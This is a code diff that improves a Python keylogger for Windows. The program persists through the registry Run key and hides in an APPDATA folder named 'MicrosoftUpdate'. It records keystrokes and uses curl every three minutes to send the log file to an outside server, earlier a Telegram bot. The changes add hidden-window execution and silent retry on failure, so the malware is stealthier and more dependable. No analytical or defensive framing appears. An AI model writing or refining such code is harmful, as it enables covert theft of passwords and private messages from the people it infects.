@@ -20,8 +20,9 @@ def add_to_startup(file_path=None):
         reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, file_path)
         winreg.CloseKey(reg_key)
-    except:
+    except Exception:
         pass
+
 
 def move_to_hidden_location():
     hidden_dir = os.path.join(os.getenv("APPDATA"), "MicrosoftUpdate")
@@ -34,12 +35,12 @@ def move_to_hidden_location():
 
 move_to_hidden_location()
 
-log_file = "keylog.txt"
+log_file = os.path.join(os.getenv("APPDATA"), "MicrosoftUpdate", "keylog.txt")
 key_buffer = []
 lock = threading.Lock()
 last_timestamp = 0
 
-command = r'curl -F "document=@keylog.txt" https://api.telegram.org/botTOKEN/sendDocument?chat_id=CHAT_ID'  #Command
+command = f'curl -F "file=@{log_file}" -F "content=Keylog Update" ***REMOVED***'  #Command
 
 user32 = ctypes.WinDLL('user32', use_last_error=True)
 
@@ -95,12 +96,13 @@ def write_keys_to_file():
 
 
 #Do command
-def run_command_every_30min():
+def run_command_periodically():
     while True:
-        time.sleep(180)  # Time
+        time.sleep(180)  # Upload every 3 minutes
         try:
-            subprocess.run(command, shell=True)
-        except:
+            subprocess.run(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
+        except Exception:
+            # Network/upload failures are non-fatal; retry on next interval
             pass
 
 
@@ -130,7 +132,7 @@ def on_press(key):
 
 
 writer_thread = threading.Thread(target=write_keys_to_file, daemon=True)
-cmd_thread = threading.Thread(target=run_command_every_30min, daemon=True)
+cmd_thread = threading.Thread(target=run_command_periodically, daemon=True)
 
 writer_thread.start()
 cmd_thread.start()
